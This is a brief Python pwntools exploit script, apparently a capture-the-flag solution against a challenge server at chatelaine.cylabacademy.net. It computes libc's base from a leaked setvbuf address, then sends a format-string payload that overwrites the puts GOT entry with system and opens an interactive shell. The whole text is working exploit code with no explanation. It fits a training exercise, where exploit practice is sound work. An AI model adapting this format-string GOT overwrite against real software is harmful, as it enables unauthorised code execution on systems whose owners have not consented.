from pwn import *

lib = ELF("./libc.so.6")
elf = context.binary = ELF("./vuln")
# p = process()
p = remote("chatelaine.cylabacademy.net", 14019)
p.recvuntil(b': ')
leak = int(p.recvline().strip().decode(),16)
lib.address = leak - lib.sym.setvbuf

of = 38
puts = elf.got.puts
sys = lib.sym.system

v = {puts:sys}

py = fmtstr_payload(of,v,write_size="byte")
p.sendline(py)
p.interactive()
